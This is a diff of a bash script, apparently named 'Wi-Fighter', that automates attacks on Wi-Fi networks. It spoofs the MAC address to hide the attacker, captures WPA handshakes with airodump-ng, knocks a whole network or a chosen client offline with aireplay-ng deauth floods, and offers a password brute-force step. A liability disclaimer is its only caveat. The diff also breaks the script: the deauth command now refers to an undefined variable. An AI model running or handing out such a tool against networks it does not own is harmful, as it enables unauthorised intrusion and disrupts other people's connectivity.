@@ -1,8 +1,9 @@
 #!/bin/bash
 
 #Script made by rootforce.
-#Do not use this script for illegal purposes.
-#Use it in your own network for educational purposes ONLY.
+#Disclaimer: Developers assume no liability and are not    ::
+#responsible for any misuse or damage caused by this script.  ::
+#Only use for educational purporses!! 
 
 
 
@@ -11,20 +12,40 @@ function ctrl_c {
   echo -e "\n OK"
 }
 
+#ASCII ART
+
+echo "                         
+░██╗░░░░░░░██╗██╗░░░░░░███████╗██╗░██████╗░██╗░░██╗████████╗███████╗██████╗░
+░██║░░██╗░░██║██║░░░░░░██╔════╝██║██╔════╝░██║░░██║╚══██╔══╝██╔════╝██╔══██╗
+░╚██╗████╗██╔╝██║█████╗█████╗░░██║██║░░██╗░███████║░░░██║░░░█████╗░░██████╔╝
+░░████╔═████║░██║╚════╝██╔══╝░░██║██║░░╚██╗██╔══██║░░░██║░░░██╔══╝░░██╔══██╗
+░░╚██╔╝░╚██╔╝░██║░░░░░░██║░░░░░██║╚██████╔╝██║░░██║░░░██║░░░███████╗██║░░██║
+░░░╚═╝░░░╚═╝░░╚═╝░░░░░░╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝
+"
+
+
 #Menu
-echo -e "---Select option --- \n
-           1. Step 1 (Search for a Target Network) \n
-           2. Step 2 (Attack the Network and Brute Force the Password)          "
+echo -e "           -------------- Select option ---------------  \n
+           1.Search for a Target Network (Step 1) \n
+           2.Attack the Network and Brute Force the Password (Step 2)           "
 
 read choice
 
+
 if [ $choice -eq '1' ];
 then
+	
 	#kills procceses that may cause trouble
 	airmon-ng check kill
-
+	
+	echo "Tip: You can find the diserible interface by opening a new terminal and pressing ifconfig!"
 	echo "Enter which wlan to start in monitor mode=>"
 	read givenwlan
+	
+	#Masking your MAC address
+	sudo ifconfig $givenwlan down
+	sudo macchanger -r $givenwlan
+	ifconfig $givenwlan up
 	
 	#starts wlan interface
 	airmon-ng start $givenwlan
@@ -48,13 +69,13 @@ then
 	 ###      -e     enables interpretation of backslash escapes     ###
 	echo -e "------------------\n|Check here for the handshake|---------------------|"
 	echo -e "\n|Open a new tab and run script again with option 2|-------------------|"
-	sleep 4
+	sleep 5
 	
 	#Waiting for the handshake while deauthing in a new terminal
 	sudo airodump-ng --bssid $bssid -c $chan -w $filename $givenwlan
 else
 
-	echo -e "-----Select the option ----- \n
+	echo -e "           -------------- Select option ---------------  \n
 		   1. Deauth all the network\n
 		   2. Deauth specific client (More accurate)           "
 	read choice2
@@ -65,15 +86,12 @@ else
 
 				echo "Enter Networks BSSID =>"
 				read bssid
-
-				echo "Enter monitor name (wlan0?)=>"
-				read monname
 				  
 				echo "---Press Ctrl+C after the handshake---\n \n"
 
 				sleep 2
 				#deauths the entire network
-				sudo aireplay-ng --deauth 50 -a $bssid $monname
+				sudo aireplay-ng --deauth 50 -a $bssid $amonname
 			else
 				echo "Enter Networks BSSID =>"
 				read bssid
